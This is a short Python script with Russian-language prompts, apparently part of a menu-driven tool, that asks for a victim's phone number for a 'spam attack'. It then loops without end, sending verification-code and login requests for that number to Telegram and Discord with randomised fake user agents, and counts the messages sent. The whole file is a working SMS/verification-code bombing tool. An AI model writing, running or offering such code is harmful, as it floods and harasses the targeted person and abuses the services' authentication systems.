import requests
import fake_useragent
import os

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
number = int(input("[?] Введите номер телефона для спам атаки -> "))
count = 0
nomer = number

try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})

        count += 1
        print("[!] Атака начата на номер", number, " всего отправлено:", count, "сообщений")
except Exception as e:
    print('[!] Ошибка, проверьте вводимые данные')
back = input("[!] Нажмите ENTER для возврата в главное меню\n")
os.system("clear")
os.system("python main.py")
